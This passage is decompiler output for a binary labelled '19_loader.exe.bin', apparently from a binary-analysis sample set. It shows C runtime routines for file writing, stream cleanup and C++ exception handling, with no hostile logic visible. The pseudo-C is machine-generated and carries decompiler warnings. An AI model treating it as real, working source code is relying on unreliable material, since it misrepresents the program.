    *(undefined4 *)((longlong)register0x00000020 + lVar6 + 0x18) = 0;
    *(undefined8 *)((longlong)register0x00000020 + lVar6 + 8) = 0;
    nNumberOfBytesToWrite = (int)((longlong)psVar7 - (longlong)(&param_5 + lVar6) >> 1) * 2;
    *(undefined8 *)((longlong)&uStack_20 + lVar6) = 0x14001dd96;
    BVar4 = WriteFile(hFile,&param_5 + lVar6,nNumberOfBytesToWrite,
                      (LPDWORD)((longlong)register0x00000020 + lVar6 + 0x18),
                      *(LPOVERLAPPED *)((longlong)register0x00000020 + lVar6 + 8));
    if (BVar4 == 0) {
      *(undefined8 *)((longlong)&uStack_20 + lVar6) = 0x14001ddb2;
      DVar5 = GetLastError();
      *param_1 = DVar5;
      break;
    }
    uVar2 = *(uint *)((longlong)register0x00000020 + lVar6 + 0x18);
    param_1[1] = param_1[1] + uVar2;
  } while (nNumberOfBytesToWrite <= uVar2);
  uVar3 = *(ulonglong *)((longlong)register0x00000020 + lVar6 + 0x1428);
  *(undefined8 *)((longlong)&uStack_20 + lVar6) = 0x14001ddc7;
  FUN_14001a2d0(uVar3 ^ (longlong)register0x00000020 + lVar6 + -0x18);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1dde0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001dde0 rva=0x1dde0 */

void FUN_14001dde0(DWORD *param_1,uint param_2,short *param_3,uint param_4,undefined1 param_5)

{
  short sVar1;
  HANDLE hFile;
  uint uVar2;
  BOOL BVar3;
  DWORD DVar4;
  longlong lVar5;
  uint uVar6;
  ulonglong uVar7;
  short *psVar8;
  short *psVar9;
  undefined8 uStackX_10;
  undefined8 uStack_30;
  
  uStack_30 = 0x14001ddfc;
  lVar5 = FUN_140013c00();
  lVar5 = -lVar5;
  *(ulonglong *)((longlong)register0x00000020 + lVar5 + 0x1438) =
       DAT_1400dfc40 ^ (longlong)register0x00000020 + lVar5 + -0x28;
  hFile = *(HANDLE *)
           ((&DAT_1400e0d40)[(longlong)(int)param_2 >> 6] + 0x28 +
           (ulonglong)(param_2 & 0x3f) * 0x48);
  param_1[0] = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  psVar8 = param_3;
  do {
    if ((short *)((ulonglong)param_4 + (longlong)param_3) <= psVar8) {
LAB_14001df25:
      uVar7 = *(ulonglong *)((longlong)register0x00000020 + lVar5 + 0x1438);
      *(undefined8 *)((longlong)&uStack_30 + lVar5) = 0x14001df38;
      FUN_14001a2d0(uVar7 ^ (longlong)register0x00000020 + lVar5 + -0x28);
      return;
    }
    psVar9 = (short *)(&param_5 + lVar5);
    do {
      if ((short *)((ulonglong)param_4 + (longlong)param_3) <= psVar8) break;
      sVar1 = *psVar8;
      psVar8 = psVar8 + 1;
      if (sVar1 == 10) {
        *psVar9 = 0xd;
        psVar9 = psVar9 + 1;
      }
      *psVar9 = sVar1;
      psVar9 = psVar9 + 1;
    } while (psVar9 < (short *)((longlong)register0x00000020 + lVar5 + 0x6d0));
    *(undefined8 *)((longlong)&uStackX_10 + lVar5) = 0;
    *(undefined8 *)((longlong)register0x00000020 + lVar5 + 8) = 0;
    *(undefined4 *)((longlong)register0x00000020 + lVar5) = 0xd55;
    *(longlong *)((longlong)register0x00000020 + lVar5 + -8) =
         (longlong)register0x00000020 + lVar5 + 0x6d8;
    *(undefined8 *)((longlong)&uStack_30 + lVar5) = 0x14001dec6;
    uVar2 = FUN_14001b0e8(0xfde9,0,&param_5 + lVar5,
                          (int)((longlong)psVar9 - (longlong)(&param_5 + lVar5) >> 1));
    if (uVar2 == 0) {
LAB_14001df1d:
      *(undefined8 *)((longlong)&uStack_30 + lVar5) = 0x14001df23;
      DVar4 = GetLastError();
      *param_1 = DVar4;
      goto LAB_14001df25;
    }
    uVar7 = 0;
    if (uVar2 != 0) {
      do {
        *(undefined4 *)((longlong)register0x00000020 + lVar5 + 0x18) = 0;
        *(undefined8 *)((longlong)register0x00000020 + lVar5 + -8) = 0;
        *(undefined8 *)((longlong)&uStack_30 + lVar5) = 0x14001defe;
        BVar3 = WriteFile(hFile,(LPCVOID)((longlong)register0x00000020 + uVar7 + lVar5 + 0x6d8),
                          uVar2 - (int)uVar7,(LPDWORD)((longlong)register0x00000020 + lVar5 + 0x18),
                          *(LPOVERLAPPED *)((longlong)register0x00000020 + lVar5 + -8));
        if (BVar3 == 0) goto LAB_14001df1d;
        uVar6 = (int)uVar7 + *(int *)((longlong)register0x00000020 + lVar5 + 0x18);
        uVar7 = (ulonglong)uVar6;
      } while (uVar6 < uVar2);
    }
    param_1[1] = (int)psVar8 - (int)param_3;
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1df54 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001df54 rva=0x1df54 */

int FUN_14001df54(void)

{
  longlong lVar1;
  ulonglong uVar2;
  int iVar3;
  longlong lVar4;
  int local_18;
  
  local_18 = 0;
  FUN_140016ab4(8);
  for (iVar3 = 3; iVar3 != DAT_1400e11a0; iVar3 = iVar3 + 1) {
    lVar4 = (longlong)iVar3;
    lVar1 = *(longlong *)(DAT_1400e11a8 + lVar4 * 8);
    if (lVar1 != 0) {
      if (((*(uint *)(lVar1 + 0x14) >> 0xd & 1) != 0) &&
         (uVar2 = FUN_140021040(*(int **)(DAT_1400e11a8 + lVar4 * 8)), (int)uVar2 != -1)) {
        local_18 = local_18 + 1;
      }
      DeleteCriticalSection((LPCRITICAL_SECTION)(*(longlong *)(DAT_1400e11a8 + lVar4 * 8) + 0x30));
      FUN_140017fb0(*(LPVOID *)(DAT_1400e11a8 + lVar4 * 8));
      *(undefined8 *)(DAT_1400e11a8 + lVar4 * 8) = 0;
    }
  }
  FUN_140016ad0(8);
  return local_18;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e008 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e008 rva=0x1e008 */

void FUN_14001e008(undefined8 *param_1)

{
  if (((*(uint *)((longlong)param_1 + 0x14) >> 0xd & 1) != 0) &&
     ((*(uint *)((longlong)param_1 + 0x14) >> 6 & 1) != 0)) {
    FUN_140017fb0((LPVOID)param_1[1]);
    LOCK();
    *(uint *)((longlong)param_1 + 0x14) = *(uint *)((longlong)param_1 + 0x14) & 0xfffffebf;
    UNLOCK();
    param_1[1] = 0;
    *param_1 = 0;
    *(undefined4 *)(param_1 + 2) = 0;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e04c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e04c rva=0x1e04c */

byte FUN_14001e04c(uint param_1)

{
  undefined8 *puVar1;
  
  if (param_1 == 0xfffffffe) {
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_1400e1140)) {
      return *(byte *)((&DAT_1400e0d40)[(ulonglong)(longlong)(int)param_1 >> 6] + 0x38 +
                      (ulonglong)(param_1 & 0x3f) * 0x48) & 0x40;
    }
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 9;
    FUN_1400180c4();
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e0b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e0b0 rva=0x1e0b0 */

undefined4 FUN_14001e0b0(longlong param_1,ulonglong *param_2)

{
  longlong lVar1;
  ulonglong uVar2;
  uint uVar3;
  ulonglong uVar4;
  
  if (param_1 != 0) {
    uVar2 = param_2[1];
    lVar1 = uVar2 + (longlong)*(int *)(param_1 + 0x18);
    if (lVar1 != 0) {
      if (*(uint *)(param_1 + 0x14) != 0) {
        uVar4 = 0;
        do {
          if (*param_2 < (longlong)*(int *)(lVar1 + uVar4 * 8) + uVar2) break;
          uVar3 = (int)uVar4 + 1;
          uVar4 = (ulonglong)uVar3;
        } while (uVar3 < *(uint *)(param_1 + 0x14));
        if ((int)uVar4 != 0) {
          return *(undefined4 *)
                  (uVar2 + (ulonglong)((int)uVar4 - 1) * 8 + 4 + (longlong)*(int *)(param_1 + 0x18))
          ;
        }
      }
      return 0xffffffff;
    }
  }
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e120 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e120 rva=0x1e120 */

undefined4 FUN_14001e120(longlong param_1,longlong param_2,ulonglong param_3)

{
  longlong lVar1;
  longlong lVar2;
  uint uVar3;
  ulonglong uVar4;
  
  if (param_1 != 0) {
    lVar2 = *(longlong *)(param_2 + 8);
    lVar1 = lVar2 + *(int *)(param_1 + 0x18);
    if (lVar1 != 0) {
      if (*(uint *)(param_1 + 0x14) != 0) {
        uVar4 = 0;
        do {
          if (param_3 < (ulonglong)(*(int *)(lVar1 + uVar4 * 8) + lVar2)) break;
          uVar3 = (int)uVar4 + 1;
          uVar4 = (ulonglong)uVar3;
        } while (uVar3 < *(uint *)(param_1 + 0x14));
        if ((int)uVar4 != 0) {
          return *(undefined4 *)
                  (lVar2 + (ulonglong)((int)uVar4 - 1) * 8 + 4 + (longlong)*(int *)(param_1 + 0x18))
          ;
        }
      }
      return 0xffffffff;
    }
  }
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e190 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e190 rva=0x1e190 */

int FUN_14001e190(longlong *param_1,ulonglong *param_2,longlong param_3)

{
  longlong lVar1;
  int iVar2;
  ulonglong uVar3;
  uint uVar4;
  ulonglong uVar5;
  
  iVar2 = *(int *)((longlong)*(int *)(param_3 + 0x1c) + *param_1);
  if (iVar2 != -2) {
    return iVar2;
  }
  uVar3 = param_2[1];
  lVar1 = uVar3 + (longlong)*(int *)(param_3 + 0x18);
  if (lVar1 == 0) {
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  if (*(uint *)(param_3 + 0x14) != 0) {
    uVar5 = 0;
    do {
      if (*param_2 < (longlong)*(int *)(lVar1 + uVar5 * 8) + uVar3) break;
      uVar4 = (int)uVar5 + 1;
      uVar5 = (ulonglong)uVar4;
    } while (uVar4 < *(uint *)(param_3 + 0x14));
    if ((int)uVar5 != 0) {
      return *(int *)(uVar3 + (ulonglong)((int)uVar5 - 1) * 8 + 4 +
                     (longlong)*(int *)(param_3 + 0x18));
    }
  }
  return -1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e1ab | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e1ab rva=0x1e1ab */

undefined4 FUN_14001e1ab(undefined8 param_1,undefined8 param_2,longlong param_3,longlong param_4)

{
  longlong lVar1;
  uint uVar2;
  ulonglong uVar3;
  ulonglong *in_R11;
  
  lVar1 = param_4 + *(int *)(param_3 + 0x18);
  if (lVar1 == 0) {
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  if (*(uint *)(param_3 + 0x14) != 0) {
    uVar3 = 0;
    do {
      if (*in_R11 < (ulonglong)(*(int *)(lVar1 + uVar3 * 8) + param_4)) break;
      uVar2 = (int)uVar3 + 1;
      uVar3 = (ulonglong)uVar2;
    } while (uVar2 < *(uint *)(param_3 + 0x14));
    if ((int)uVar3 != 0) {
      return *(undefined4 *)
              (param_4 + (ulonglong)((int)uVar3 - 1) * 8 + 4 + (longlong)*(int *)(param_3 + 0x18));
    }
  }
  return 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e1f7 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e1f7 rva=0x1e1f7 */

void FUN_14001e1f7(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e1fc | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e1fc rva=0x1e1fc */

undefined8 FUN_14001e1fc(void)

{
  return 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e20b | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e20b rva=0x1e20b */

void thunk_FUN_1400160f8(void)

{
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e220 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e220 rva=0x1e220 */

void FUN_14001e220(longlong *param_1,undefined8 param_2,longlong param_3,undefined4 param_4)

{
  *(undefined4 *)((longlong)*(int *)(param_3 + 0x1c) + *param_1) = param_4;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e230 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e230 rva=0x1e230 */

void FUN_14001e230(longlong *param_1,ulonglong *param_2,longlong param_3,int param_4)

{
  longlong *plVar1;
  longlong local_res18 [2];
  
  plVar1 = FUN_140019160(param_1,param_2,param_3,local_res18);
  if (*(int *)((longlong)*(int *)(param_3 + 0x1c) + 4 + *plVar1) < param_4) {
    *(int *)((longlong)*(int *)(param_3 + 0x1c) + 4 + *plVar1) = param_4;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e270 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e270 rva=0x1e270 */

undefined4 FUN_14001e270(longlong *param_1,ulonglong *param_2,longlong param_3)

{
  longlong *plVar1;
  longlong local_res18 [2];
  
  plVar1 = FUN_140019160(param_1,param_2,param_3,local_res18);
  return *(undefined4 *)((longlong)*(int *)(param_3 + 0x1c) + 4 + *plVar1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e2a0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e2a0 rva=0x1e2a0 */

void FUN_14001e2a0(longlong *param_1,ulonglong *param_2,longlong param_3,int param_4)

{
  int iVar1;
  int iVar2;
  undefined8 uVar3;
  PVOID pvVar4;
  longlong lVar5;
  longlong lVar6;
  
  uVar3 = FUN_1400194c0();
  iVar2 = FUN_14001e190(param_1,param_2,param_3);
  pvVar4 = FUN_1400161f0();
  *(int *)((longlong)pvVar4 + 0x30) = *(int *)((longlong)pvVar4 + 0x30) + 1;
  while ((iVar2 != -1 && (param_4 < iVar2))) {
    if ((iVar2 < 0) || (*(int *)(param_3 + 4) <= iVar2)) {
                    /* WARNING: Subroutine does not return */
      FUN_1400160f8();
    }
    lVar5 = FUN_1400194c0();
    lVar6 = (longlong)iVar2 * 8;
    iVar2 = *(int *)(*(int *)(param_3 + 8) + lVar6 + lVar5);
    iVar1 = *(int *)(param_3 + 8);
    lVar5 = FUN_1400194c0();
    if (*(int *)(lVar5 + iVar1 + 4 + lVar6) != 0) {
      iVar1 = *(int *)(param_3 + 8);
      lVar5 = FUN_1400194c0();
      iVar1 = *(int *)(lVar5 + iVar1 + 4 + lVar6);
      lVar5 = FUN_1400194c0();
      if (lVar5 + iVar1 != 0) {
        FUN_14001e220(param_1,param_2,param_3,iVar2);
        iVar1 = *(int *)(param_3 + 8);
        lVar5 = FUN_1400194c0();
        if (*(int *)(lVar5 + iVar1 + 4 + lVar6) != 0) {
          FUN_1400194c0();
          FUN_1400194c0();
        }
        FUN_140021250();
        FUN_1400194e0(uVar3);
      }
    }
  }
  pvVar4 = FUN_1400161f0();
  if (0 < *(int *)((longlong)pvVar4 + 0x30)) {
    pvVar4 = FUN_1400161f0();
    *(int *)((longlong)pvVar4 + 0x30) = *(int *)((longlong)pvVar4 + 0x30) + -1;
  }
  if ((iVar2 != -1) && (param_4 < iVar2)) {
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  FUN_14001e220(param_1,param_2,param_3,iVar2);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e450 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e450 rva=0x1e450 */

undefined8 FUN_14001e450(longlong param_1)

{
  undefined8 uVar1;
  undefined8 uVar2;
  int *piVar3;
  longlong lVar4;
  longlong lVar5;
  longlong *plVar6;
  PVOID pvVar7;
  undefined8 *puVar8;
  undefined8 uVar9;
  undefined8 uVar10;
  undefined8 local_48 [2];
  
  pvVar7 = FUN_1400161f0();
  uVar1 = *(undefined8 *)((longlong)pvVar7 + 0x28);
  pvVar7 = FUN_1400161f0();
  uVar2 = *(undefined8 *)((longlong)pvVar7 + 0x20);
  piVar3 = *(int **)(param_1 + 0x50);
  lVar4 = *(longlong *)(param_1 + 0x48);
  lVar5 = *(longlong *)(param_1 + 0x40);
  plVar6 = *(longlong **)(param_1 + 0x28);
  FUN_1400160c0(lVar5);
  pvVar7 = FUN_1400161f0();
  *(int **)((longlong)pvVar7 + 0x20) = piVar3;
  pvVar7 = FUN_1400161f0();
  *(longlong *)((longlong)pvVar7 + 0x28) = lVar5;
  pvVar7 = FUN_1400161f0();
  puVar8 = FUN_140019540(local_48,*(undefined8 *)(*(longlong *)((longlong)pvVar7 + 0x20) + 0x28));
  if (*(longlong *)(param_1 + 0x58) != 0) {
    FUN_1400161f0();
  }
  uVar9 = FUN_140021250();
  FUN_140019580((longlong)puVar8);
  if ((((*piVar3 == -0x1f928c9d) && (piVar3[6] == 4)) && (piVar3[8] + 0xe66cfae0U < 3)) &&
     (uVar10 = FUN_1400149f0(*(longlong *)(piVar3 + 10)), (int)uVar10 != 0)) {
    FUN_140014960(piVar3);
  }
  pvVar7 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar7 + 0x20) = uVar2;
  pvVar7 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar7 + 0x28) = uVar1;
  *(undefined8 *)((longlong)*(int *)(lVar4 + 0x1c) + *plVar6) = 0xfffffffffffffffe;
  return uVar9;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e660 | partial_markers_remain ===== */
/* address=14001e660 rva=0x1e660 */

void FUN_14001e660(undefined8 param_1,undefined *UNRECOVERED_JUMPTABLE,undefined8 param_3)

{
                    /* WARNING: Could not recover jumptable at 0x00014001e666. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)UNRECOVERED_JUMPTABLE)(param_1,param_3);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e670 | partial_markers_remain ===== */
/* address=14001e670 rva=0x1e670 */

void FUN_14001e670(undefined8 param_1,undefined *UNRECOVERED_JUMPTABLE,undefined8 param_3,
                  undefined4 param_4)

{
                    /* WARNING: Could not recover jumptable at 0x00014001e67c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)UNRECOVERED_JUMPTABLE)(param_1,param_3,param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e680 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e680 rva=0x1e680 */

undefined8 * FUN_14001e680(undefined8 *param_1,longlong param_2)

{
  *param_1 = std::exception::vftable;
  param_1[1] = 0;
  param_1[2] = 0;
  FUN_140021290((longlong *)(param_2 + 8),param_1 + 1);
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e6c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e6c0 rva=0x1e6c0 */

char * FUN_14001e6c0(longlong param_1)

{
  char *pcVar1;
  
  pcVar1 = "Unknown exception";
  if (*(char **)(param_1 + 8) != (char *)0x0) {
    pcVar1 = *(char **)(param_1 + 8);
  }
  return pcVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e6e0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e6e0 rva=0x1e6e0 */

undefined8 * FUN_14001e6e0(undefined8 *param_1,uint param_2)

{
  *param_1 = std::exception::vftable;
  FUN_140021330(param_1 + 1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_140017fb0(param_1);
  }
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e730 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e730 rva=0x1e730 */

undefined8 * FUN_14001e730(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad exception";
  *param_1 = std::bad_exception::vftable;
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e780 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e780 rva=0x1e780 */

undefined8 * FUN_14001e780(undefined8 *param_1,longlong param_2)

{
  *param_1 = std::exception::vftable;
  param_1[1] = 0;
  param_1[2] = 0;
  FUN_140021290((longlong *)(param_2 + 8),param_1 + 1);
  *param_1 = std::bad_exception::vftable;
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e7c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e7c0 rva=0x1e7c0 */

undefined8 FUN_14001e7c0(undefined8 *param_1,longlong param_2,undefined4 *param_3)

{
  int *piVar1;
  PVOID pvVar2;
  
  piVar1 = (int *)*param_1;
  *param_3 = 0;
  if (*piVar1 == -0x1f928c9d) {
    if (((piVar1[6] == 4) && (piVar1[8] + 0xe66cfae0U < 3)) &&
       (*(longlong *)(piVar1 + 10) == *(longlong *)(param_2 + 0x28))) {
      *param_3 = 1;
    }
    if (((*piVar1 == -0x1f928c9d) && (piVar1[6] == 4)) &&
       ((piVar1[8] + 0xe66cfae0U < 3 && (*(longlong *)(piVar1 + 0xc) == 0)))) {
      pvVar2 = FUN_1400161f0();
      *(undefined4 *)((longlong)pvVar2 + 0x40) = 1;
      *param_3 = 1;
      return 1;
    }
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e850 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e850 rva=0x1e850 */

undefined1 FUN_14001e850(longlong param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  uint *puVar3;
  longlong lVar4;
  longlong lVar5;
  undefined8 uVar6;
  int iVar7;
  undefined1 uVar8;
  int *piVar9;
  int iVar10;
  undefined1 uStackX_10;
  
  if (param_2 == (int *)0x0) {
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  uVar8 = 0;
  iVar10 = 0;
  uStackX_10 = 0;
  if (0 < *param_2) {
    do {
      iVar7 = *(int *)(*(longlong *)(param_1 + 0x30) + 0xc);
      lVar4 = FUN_140019500();
      piVar9 = (int *)((longlong)iVar7 + lVar4 + 4);
      iVar7 = *(int *)(*(longlong *)(param_1 + 0x30) + 0xc);
      lVar4 = FUN_140019500();
      iVar7 = *(int *)(lVar4 + iVar7);
      if (0 < iVar7) {
        do {
          iVar1 = *piVar9;
          lVar4 = FUN_140019500();
          puVar3 = *(uint **)(param_1 + 0x30);
          iVar2 = param_2[1];
          lVar5 = FUN_1400194c0();
          uVar6 = FUN_14001ea00((byte *)(lVar5 + (longlong)iVar10 * 0x14 + (longlong)iVar2),
                                (byte *)(iVar1 + lVar4),puVar3);
          if ((int)uVar6 != 0) {
            uVar8 = 1;
            uStackX_10 = 1;
            goto LAB_14001e91c;
          }
          iVar7 = iVar7 + -1;
          piVar9 = piVar9 + 1;
        } while (0 < iVar7);
        uVar8 = uStackX_10;
      }
LAB_14001e91c:
      iVar10 = iVar10 + 1;
    } while (iVar10 < *param_2);
  }
  return uVar8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e86d | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e86d rva=0x1e86d */

undefined1 FUN_14001e86d(undefined8 param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  uint *puVar3;
  longlong in_RAX;
  longlong lVar4;
  longlong lVar5;
  undefined8 uVar6;
  int iVar7;
  undefined8 unaff_RBX;
  undefined8 unaff_RBP;
  longlong unaff_RSI;
  undefined1 uVar8;
  undefined8 unaff_RDI;
  undefined8 unaff_R12;
  int *unaff_R13;
  undefined8 unaff_R14;
  int *piVar9;
  int iVar10;
  undefined8 unaff_R15;
  longlong in_stack_00000060;
  undefined1 uStack0000000000000068;
  
  *(undefined8 *)(in_RAX + -0x20) = unaff_RDI;
  uVar8 = 0;
  *(undefined8 *)(in_RAX + -0x38) = unaff_R15;
  iVar10 = 0;
  uStack0000000000000068 = 0;
  if (0 < *param_2) {
    *(undefined8 *)(in_RAX + 0x18) = unaff_RBX;
    *(undefined8 *)(in_RAX + -0x18) = unaff_RBP;
    *(undefined8 *)(in_RAX + -0x28) = unaff_R12;
    *(undefined8 *)(in_RAX + -0x30) = unaff_R14;
    do {
      iVar7 = *(int *)(*(longlong *)(unaff_RSI + 0x30) + 0xc);
      lVar4 = FUN_140019500();
      piVar9 = (int *)((longlong)iVar7 + lVar4 + 4);
      iVar7 = *(int *)(*(longlong *)(unaff_RSI + 0x30) + 0xc);
      lVar4 = FUN_140019500();
      iVar7 = *(int *)(lVar4 + iVar7);
      if (0 < iVar7) {
        do {
          iVar1 = *piVar9;
          lVar4 = FUN_140019500();
          puVar3 = *(uint **)(unaff_RSI + 0x30);
          iVar2 = unaff_R13[1];
          lVar5 = FUN_1400194c0();
          uVar6 = FUN_14001ea00((byte *)(lVar5 + (longlong)iVar10 * 0x14 + (longlong)iVar2),
                                (byte *)(iVar1 + lVar4),puVar3);
          unaff_RSI = in_stack_00000060;
          if ((int)uVar6 != 0) {
            uVar8 = 1;
            uStack0000000000000068 = 1;
            goto LAB_14001e91c;
          }
          iVar7 = iVar7 + -1;
          piVar9 = piVar9 + 1;
        } while (0 < iVar7);
        uVar8 = uStack0000000000000068;
      }
LAB_14001e91c:
      iVar10 = iVar10 + 1;
    } while (iVar10 < *unaff_R13);
  }
  return uVar8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e889 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e889 rva=0x1e889 */

undefined1 FUN_14001e889(void)

{
  int iVar1;
  int iVar2;
  uint *puVar3;
  longlong in_RAX;
  longlong lVar4;
  longlong lVar5;
  undefined8 uVar6;
  int iVar7;
  undefined8 unaff_RBX;
  undefined8 unaff_RBP;
  longlong unaff_RSI;
  undefined1 unaff_DIL;
  undefined8 unaff_R12;
  int *unaff_R13;
  undefined8 unaff_R14;
  int *piVar8;
  int unaff_R15D;
  longlong in_stack_00000060;
  undefined1 in_stack_00000068;
  
  *(undefined8 *)(in_RAX + 0x18) = unaff_RBX;
  *(undefined8 *)(in_RAX + -0x18) = unaff_RBP;
  *(undefined8 *)(in_RAX + -0x28) = unaff_R12;
  *(undefined8 *)(in_RAX + -0x30) = unaff_R14;
  do {
    iVar7 = *(int *)(*(longlong *)(unaff_RSI + 0x30) + 0xc);
    lVar4 = FUN_140019500();
    piVar8 = (int *)((longlong)iVar7 + lVar4 + 4);
    iVar7 = *(int *)(*(longlong *)(unaff_RSI + 0x30) + 0xc);
    lVar4 = FUN_140019500();
    iVar7 = *(int *)(lVar4 + iVar7);
    if (0 < iVar7) {
      do {
        iVar1 = *piVar8;
        lVar4 = FUN_140019500();
        puVar3 = *(uint **)(unaff_RSI + 0x30);
        iVar2 = unaff_R13[1];
        lVar5 = FUN_1400194c0();
        uVar6 = FUN_14001ea00((byte *)(lVar5 + (longlong)unaff_R15D * 0x14 + (longlong)iVar2),
                              (byte *)(iVar1 + lVar4),puVar3);
        unaff_RSI = in_stack_00000060;
        if ((int)uVar6 != 0) {
          unaff_DIL = 1;
          in_stack_00000068 = 1;
          goto LAB_14001e91c;
        }
        iVar7 = iVar7 + -1;
        piVar8 = piVar8 + 1;
      } while (0 < iVar7);
      unaff_DIL = in_stack_00000068;
    }
LAB_14001e91c:
    unaff_R15D = unaff_R15D + 1;
    if (*unaff_R13 <= unaff_R15D) {
      return unaff_DIL;
    }
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e93d | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e93d rva=0x1e93d */

undefined1 FUN_14001e93d(void)

{
  undefined1 unaff_DIL;
  
  return unaff_DIL;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e953 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e953 rva=0x1e953 */

void thunk_FUN_1400160f8(void)

{
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e960 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e960 rva=0x1e960 */

ulonglong FUN_14001e960(int *param_1)

{
  int iVar1;
  uint uVar2;
  ulonglong in_RAX;
  longlong lVar3;
  undefined4 extraout_var;
  int iVar4;
  
  iVar4 = 0;
  if (0 < *param_1) {
    do {
      iVar1 = param_1[1];
      lVar3 = FUN_1400194c0();
      if (*(int *)(lVar3 + iVar1 + 4 + (longlong)iVar4 * 0x14) == 0) {
        lVar3 = 0;
      }
      else {
        iVar1 = param_1[1];
        lVar3 = FUN_1400194c0();
        iVar1 = *(int *)(lVar3 + (longlong)iVar4 * 0x14 + 4 + (longlong)iVar1);
        lVar3 = FUN_1400194c0();
        lVar3 = lVar3 + iVar1;
      }
      uVar2 = FUN_140014b10(lVar3 + 8,0x1400e0658);
      in_RAX = CONCAT44(extraout_var,uVar2);
      if (uVar2 == 0) {
        return CONCAT71((int7)(in_RAX >> 8),1);
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < *param_1);
  }
  return in_RAX & 0xffffffffffffff00;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1e9f0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001e9f0 rva=0x1e9f0 */

void FUN_14001e9f0(int *param_1,longlong *param_2,ULONG_PTR param_3,ulonglong *param_4,uint *param_5
                  ,int param_6,undefined8 param_7,byte param_8)

{
  FUN_14001edd0(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ea00 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001ea00 rva=0x1ea00 */

